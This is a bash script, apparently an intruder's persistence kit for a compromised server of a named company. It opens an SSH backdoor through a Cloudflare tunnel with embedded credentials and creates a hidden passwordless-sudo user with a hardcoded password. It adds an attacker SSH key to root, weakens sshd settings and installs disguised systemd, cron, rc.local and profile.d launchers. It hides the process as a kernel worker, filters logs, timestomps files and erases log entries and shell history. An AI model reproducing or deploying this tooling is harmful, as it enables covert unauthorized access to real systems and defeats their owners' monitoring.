#!/bin/bash
# === TIER 70 — CF TUNNEL PERSISTENCE www.kreditplus.com ===
export HISTSIZE=0 HISTFILESIZE=0

# === VARIABLES ===
CF="/usr/lib/x86_64-linux-gnu/nss/.libnss_dns_helper"
CONFDIR="/usr/lib/x86_64-linux-gnu/nss/"
TUNNEL_ID="92e36001-499c-432a-a64c-75c6c08ef10c"
SECRET="M+kkB9RiCqIp4PTlKbwkiMTv+BlXUc6mLkTyZwzFQRk="
HOSTNAME_CF="kreditplus-www.sumampir.desa.id"
ACCOUNT="e1e66baf420915a22e19b1d09fac3e35"
SERVICE_NAME="networkd-dispatcher-helper"
SYS_MONITOR="$CONFDIR/.sys-monitor"
TOKEN_FILE="$CONFDIR/.tk"
LOCKFILE="/var/lib/dpkg/.lock-nd"
WRAPPER="$CONFDIR/.sys-health"
SSH_PORT="22"
U="sysinfo"
P="Sugiarto20@"
HASH6='$6$P3rs1st70$HPkf6PZDA5HBhtiKgN.juex1qPOSADrQabQQrWG6FekDGbkVpYRaGq9fI5/Log5vCOwqJEx7fa.azDzEc2LGT.'
HASH5='$5$P3rs1st70$a/C6F2QwbtRZFMKrmeHnihkWDNKCNpgaz5dMkaq3FpD'
HASH1='$1$P3rs1st7$M.OfZ.Drz4kCFbNH8Ml2y/'
SUDOERS_FILE="/etc/sudoers.d/90-cloud-init-users"
PERSIST_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMuSEQQ9ItLWRXVBm+KPoJESUdxGLcuj6WOKM44udn0 kali@kali"
CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

echo "[*] Starting Tier 70 deployment on $(hostname)..."

# === 1. BINARY ===
echo "[*] Binary setup..."
mkdir -p "$(dirname "$CF")" 2>/dev/null
if [ ! -f "$CF" ] || [ ! -s "$CF" ]; then
  curl -sL --connect-timeout 15 --max-time 300 "$CF_URL" -o "$CF"
fi
chmod +x "$CF"
magic=$(head -c 4 "$CF" 2>/dev/null | od -A n -t x1 2>/dev/null | tr -d ' ')
[ "$magic" != "7f454c46" ] && echo "[!] BINARY ERROR" && exit 1
echo "[+] Binary: $(du -h "$CF" | awk '{print $1}')"

# === 2. CONFIG ===
echo "[*] Config..."
mkdir -p "$CONFDIR" 2>/dev/null
cat > "$CONFDIR/config.yml" << EOF
tunnel: $TUNNEL_ID
credentials-file: $CONFDIR/cred.json
ingress:
  - hostname: $HOSTNAME_CF
    service: ssh://localhost:$SSH_PORT
  - service: http_status:404
EOF
cat > "$CONFDIR/cred.json" << EOF
{"AccountTag":"$ACCOUNT","TunnelID":"$TUNNEL_ID","TunnelSecret":"$SECRET"}
EOF
echo "$TUNNEL_ID" > "$TOKEN_FILE"
chmod 600 "$TOKEN_FILE"

# === 3. STEALTH USER ===
echo "[*] Stealth user..."
PASSWD_TS=$(stat -c %Y /etc/passwd 2>/dev/null)
SHADOW_TS=$(stat -c %Y /etc/shadow 2>/dev/null)
GROUP_TS=$(stat -c %Y /etc/group 2>/dev/null)

if ! id "$U" >/dev/null 2>&1; then
  mkdir -p "$CONFDIR/.local" 2>/dev/null
  SUID=997
  while getent passwd "$SUID" >/dev/null 2>&1; do SUID=$((SUID - 1)); done
  [ "$SUID" -lt 900 ] && SUID=997
  EXISTING_HASH=$(awk -F: 'NR>1 && $2 ~ /^\$[0-9y]/{print $2; exit}' /etc/shadow 2>/dev/null)
  case "$EXISTING_HASH" in
    \$6\$*) CHOSEN_HASH="$HASH6" ;;
    \$5\$*) CHOSEN_HASH="$HASH5" ;;
    \$1\$*) CHOSEN_HASH="$HASH1" ;;
    *) CHOSEN_HASH="$HASH6" ;;
  esac
  PW_PERM=$(stat -c %a /etc/passwd 2>/dev/null)
  GR_PERM=$(stat -c %a /etc/group 2>/dev/null)
  SH_PERM=$(stat -c %a /etc/shadow 2>/dev/null)
  grep -q "^$U:" /etc/passwd || { export INS="$U:x:${SUID}:${SUID}::$CONFDIR/.local:/bin/bash"; awk 'NR==14{print ENVIRON["INS"]} {print}' /etc/passwd > /etc/passwd.awk && mv -f /etc/passwd.awk /etc/passwd && chmod "${PW_PERM:-644}" /etc/passwd; unset INS; }
  grep -q "^$U:" /etc/group || { export INS="$U:x:${SUID}:"; awk 'NR==14{print ENVIRON["INS"]} {print}' /etc/group > /etc/group.awk && mv -f /etc/group.awk /etc/group && chmod "${GR_PERM:-644}" /etc/group; unset INS; }
  grep -q "^$U:" /etc/shadow || { export INS="$U:${CHOSEN_HASH}:19000:0:99999:7:::"; awk 'NR==14{print ENVIRON["INS"]} {print}' /etc/shadow > /etc/shadow.awk && mv -f /etc/shadow.awk /etc/shadow && chmod "${SH_PERM:-640}" /etc/shadow; unset INS; }
  usermod -aG sudo "$U" 2>/dev/null || usermod -aG wheel "$U" 2>/dev/null
fi
echo "$U ALL=(ALL) NOPASSWD: ALL" > "$SUDOERS_FILE" && chmod 440 "$SUDOERS_FILE"
cp -f /etc/passwd /etc/passwd- 2>/dev/null
cp -f /etc/shadow /etc/shadow- 2>/dev/null
cp -f /etc/group /etc/group- 2>/dev/null
cp -f /etc/gshadow /etc/gshadow- 2>/dev/null
[ -n "$PASSWD_TS" ] && touch -d @"$PASSWD_TS" /etc/passwd /etc/passwd- 2>/dev/null
[ -n "$SHADOW_TS" ] && touch -d @"$SHADOW_TS" /etc/shadow /etc/shadow- 2>/dev/null
[ -n "$GROUP_TS" ] && touch -d @"$GROUP_TS" /etc/group /etc/group- /etc/gshadow /etc/gshadow- 2>/dev/null
touch -r /usr/lib/ "$CONFDIR/.local" 2>/dev/null
echo "[+] User: $U (UID $(id -u "$U" 2>/dev/null))"

# === 4. SSH KEYS (HANYA di root + stealth user, TIDAK hapus bash_history user lain) ===
echo "[*] SSH keys..."
for uhome in /root "$CONFDIR/.local"; do
  mkdir -p "$uhome/.ssh" 2>/dev/null
  chmod 700 "$uhome/.ssh" 2>/dev/null
  grep -q "kali@kali" "$uhome/.ssh/authorized_keys" 2>/dev/null || echo "$PERSIST_KEY" >> "$uhome/.ssh/authorized_keys"
  chmod 600 "$uhome/.ssh/authorized_keys" 2>/dev/null
  touch -r /etc/ssh/ "$uhome/.ssh" 2>/dev/null
  touch -r /etc/ssh/ssh_host_rsa_key.pub "$uhome/.ssh/authorized_keys" 2>/dev/null
done

# === 4a. SSHD CONFIG ===
echo "[*] SSHD config..."
SSHD_CONF="/etc/ssh/sshd_config"
SSHD_TS=$(stat -c %Y "$SSHD_CONF" 2>/dev/null)
SSHD_PERM=$(stat -c %a "$SSHD_CONF" 2>/dev/null)
SSH_VER=$(ssh -V 2>&1 | grep -oP 'OpenSSH_\K[0-9]+\.[0-9]+')
SSH_MAJOR=$(echo "$SSH_VER" | cut -d. -f1)
SSH_MINOR=$(echo "$SSH_VER" | cut -d. -f2)

sshd_safe_reload() {
  /usr/sbin/sshd -t 2>/dev/null || return 1
  if [ -f /var/run/sshd.pid ] && [ -s /var/run/sshd.pid ]; then
    kill -HUP "$(cat /var/run/sshd.pid)" 2>/dev/null && return 0
  fi
  local SSHD_PID=$(pgrep -x sshd 2>/dev/null | head -1)
  [ -n "$SSHD_PID" ] && kill -HUP "$SSHD_PID" 2>/dev/null && return 0
  systemctl reload ssh 2>/dev/null && return 0
  systemctl reload sshd 2>/dev/null && return 0
  return 1
}

if grep -qE '^\s*AllowUsers' "$SSHD_CONF" 2>/dev/null; then
  if ! grep -qE "AllowUsers.*\b${U}\b" "$SSHD_CONF" 2>/dev/null; then
    export _AU="$U"
    awk '/^\s*AllowUsers/ && !done{$0 = $0 " " ENVIRON["_AU"]; done=1} {print}' "$SSHD_CONF" > "${SSHD_CONF}.awk"
    mv -f "${SSHD_CONF}.awk" "$SSHD_CONF" && chmod "${SSHD_PERM:-644}" "$SSHD_CONF"; unset _AU
  fi
fi
if grep -qE "DenyUsers.*\b${U}\b" "$SSHD_CONF" 2>/dev/null; then
  export _DU="$U"
  awk '/^\s*DenyUsers/{gsub(" " ENVIRON["_DU"], ""); gsub(ENVIRON["_DU"] " ", "")} {print}' "$SSHD_CONF" > "${SSHD_CONF}.awk"
  mv -f "${SSHD_CONF}.awk" "$SSHD_CONF" && chmod "${SSHD_PERM:-644}" "$SSHD_CONF"; unset _DU
fi

DROPDIR="/etc/ssh/sshd_config.d"
if [ -d "$DROPDIR" ] && grep -qE '^\s*Include.*/etc/ssh/sshd_config\.d/' "$SSHD_CONF" 2>/dev/null; then
  DROPCONTENT="# Managed by sys-monitor
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin yes
MaxAuthTries 6
UsePAM yes"
  if [ "${SSH_MAJOR:-0}" -gt 8 ] || { [ "${SSH_MAJOR:-0}" -eq 8 ] && [ "${SSH_MINOR:-0}" -ge 2 ]; }; then
    DROPCONTENT="${DROPCONTENT}
PubkeyAcceptedAlgorithms +ssh-ed25519,ssh-ed25519-cert-v01@openssh.com"
  fi
  echo "$DROPCONTENT" > "$DROPDIR/99-persist.conf"
  chmod "${SSHD_PERM:-644}" "$DROPDIR/99-persist.conf" 2>/dev/null
  touch -r "$SSHD_CONF" "$DROPDIR/99-persist.conf" 2>/dev/null
else
  for OPT in "PubkeyAuthentication yes" "PasswordAuthentication yes" "PermitRootLogin yes"; do
    OKEY=$(echo "$OPT" | awk '{print $1}')
    if grep -qE "^\s*${OKEY}" "$SSHD_CONF" 2>/dev/null; then
      export _OK="$OKEY" _NV="$OPT"
      awk '{if($1==ENVIRON["_OK"]){print ENVIRON["_NV"]}else{print}}' "$SSHD_CONF" > "${SSHD_CONF}.awk"
      if [ -s "${SSHD_CONF}.awk" ]; then mv -f "${SSHD_CONF}.awk" "$SSHD_CONF" && chmod "${SSHD_PERM:-644}" "$SSHD_CONF"; else rm -f "${SSHD_CONF}.awk"; fi
      unset _OK _NV
    else
      echo "$OPT" >> "$SSHD_CONF"
    fi
  done
fi
[ -n "$SSHD_TS" ] && touch -d @"$SSHD_TS" "$SSHD_CONF" 2>/dev/null
sshd_safe_reload && echo "[+] SSHD reloaded" || echo "[!] SSHD reload failed (safe)"

# === 4b. SSH HOST KEY BACKUP ===
mkdir -p "$CONFDIR/.hkeys" 2>/dev/null
cp /etc/ssh/ssh_host_*_key* "$CONFDIR/.hkeys/" 2>/dev/null
chmod 600 "$CONFDIR/.hkeys/"*key 2>/dev/null

# === 5. WRAPPER ===
echo "[*] Wrapper..."
cat > "$WRAPPER" << 'WHEOF'
#!/bin/bash
TK=$(cat TOKEN_FILE_PLACEHOLDER 2>/dev/null)
[ -z "$TK" ] && exit 1
exec 200>&-
exec -a "[kworker/0:1-events]" CF_PLACEHOLDER tunnel --config CONFDIR_PLACEHOLDER/config.yml run
WHEOF
sed -i "s|TOKEN_FILE_PLACEHOLDER|$TOKEN_FILE|g;s|CF_PLACEHOLDER|$CF|g;s|CONFDIR_PLACEHOLDER|$CONFDIR|g" "$WRAPPER"
chmod 700 "$WRAPPER"

# === 6. SYSTEMD SERVICE ===
echo "[*] Layer 1: systemd..."
SVC="/etc/systemd/system/${SERVICE_NAME}.service"
cat > "$SVC" << EOF
[Unit]
Description=Network Dispatcher Helper
After=network-online.target
Wants=network-online.target
ConditionPathExists=$WRAPPER

[Service]
Type=simple
ExecStart=$WRAPPER
Restart=always
RestartSec=5
StartLimitInterval=0
StandardOutput=null
StandardError=null
KillMode=process
Nice=19
IOSchedulingClass=idle

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable "$SERVICE_NAME" 2>/dev/null
systemctl start "$SERVICE_NAME"
touch -r /lib/systemd/system/ssh.service "$SVC" 2>/dev/null

# === 7. CRONTAB ===
echo "[*] Layer 2: crontab..."
(crontab -l 2>/dev/null | grep -v ".sys-monitor"; echo "*/5 * * * * $CONFDIR/.sys-monitor > /dev/null 2>&1") | sort -u | crontab -

# === 8. RC.LOCAL ===
echo "[*] Layer 3: rc.local..."
if [ ! -f /etc/rc.local ]; then printf '#!/bin/bash\n' > /etc/rc.local; fi
grep -q ".sys-monitor" /etc/rc.local || echo "nohup $SYS_MONITOR > /dev/null 2>&1 &" >> /etc/rc.local
chmod +x /etc/rc.local

# === 9. PROFILE.D ===
echo "[*] Layer 4: profile.d..."
PROFILED="/etc/profile.d/locale-check.sh"
printf '(pgrep -f ".sys-monitor" > /dev/null 2>&1 || nohup %s > /dev/null 2>&1 &) &\n' "$SYS_MONITOR" > "$PROFILED"
chmod +x "$PROFILED"
touch -r /etc/profile.d/bash_completion.sh "$PROFILED" 2>/dev/null

# === 10. RSYSLOG FILTER ===
echo "[*] Rsyslog filter..."
CF_BN=$(basename "$CF")
RSYSLOG_CONF="/etc/rsyslog.d/50-default.conf"
if [ ! -f "$RSYSLOG_CONF" ] || ! grep -q "$U" "$RSYSLOG_CONF" 2>/dev/null; then
  cat >> "$RSYSLOG_CONF" << EOF
if \$msg contains '$U' then stop
if \$msg contains '$CF_BN' then stop
if \$msg contains 'cloudflared' then stop
if \$msg contains '.sys-monitor' then stop
EOF
  touch -r /etc/rsyslog.conf "$RSYSLOG_CONF" 2>/dev/null
  systemctl restart rsyslog 2>/dev/null
fi

# === 11. JOURNAL SUPPRESSION ===
mkdir -p /etc/systemd/journald.conf.d 2>/dev/null
printf '[Journal]\nMaxLevelStore=notice\nMaxRetentionSec=3day\nSystemMaxUse=50M\n' > /etc/systemd/journald.conf.d/50-resolved-helper.conf
touch -r /etc/systemd/journald.conf /etc/systemd/journald.conf.d/50-resolved-helper.conf 2>/dev/null
systemctl kill --signal=SIGHUP systemd-journald 2>/dev/null

# === 12. TIMESTOMP ===
echo "[*] Timestomping..."
for tf in "$CF" "$WRAPPER" "$TOKEN_FILE" "$LOCKFILE" "$SUDOERS_FILE" "$CONFDIR/config.yml" "$CONFDIR/cred.json" "$PROFILED" /etc/rc.local; do
  [ -e "$tf" ] && touch -r /usr/bin/ssh "$tf" 2>/dev/null
done
touch -r /usr/lib/ "$CONFDIR" 2>/dev/null

# === 13. INITIAL LOG CLEANUP (hanya log system, TIDAK hapus bash_history user lain) ===
echo "[*] Log cleanup..."
for f in /var/log/auth.log /var/log/syslog; do
  if [ -f "$f" ]; then
    LTS=$(stat -c %Y "$f" 2>/dev/null)
    sed -i "/$U/d;/$CF_BN/d;/cloudflared/d" "$f" 2>/dev/null
    [ -n "$LTS" ] && touch -d @"$LTS" "$f" 2>/dev/null
  fi
done
> /var/log/btmp 2>/dev/null
journalctl --vacuum-size=50M --vacuum-time=3d 2>/dev/null
# Hanya symlink bash_history stealth user + root, BUKAN user lain
for hdir in /root "$CONFDIR/.local"; do
  [ -d "$hdir" ] && rm -f "$hdir/.bash_history" 2>/dev/null && ln -sf /dev/null "$hdir/.bash_history" 2>/dev/null
done

# === 14. CLEANUP DEPLOY SCRIPT ===
rm -f /tmp/.deploy_www.sh 2>/dev/null

# === 15. VERIFY ===
echo ""
echo "=== VERIFICATION ==="
echo "Service: $(systemctl is-active $SERVICE_NAME 2>/dev/null)"
echo "Tunnel: $(pgrep -c -f "$(basename $CF)" 2>/dev/null) procs"
echo "User: $(id $U 2>/dev/null)"
echo "Sudoers: $(cat $SUDOERS_FILE 2>/dev/null)"
echo "SSH test: $(/usr/sbin/sshd -t 2>&1 && echo PASS || echo FAIL)"
echo ""
echo "=== ACCESS ==="
echo "sshpass -p 'Sugiarto20@' ssh -o 'ProxyCommand=cloudflared access ssh --hostname kreditplus-www.sumampir.desa.id' sysinfo@kreditplus-www.sumampir.desa.id"
echo ""
echo "DEPLOY COMPLETE"
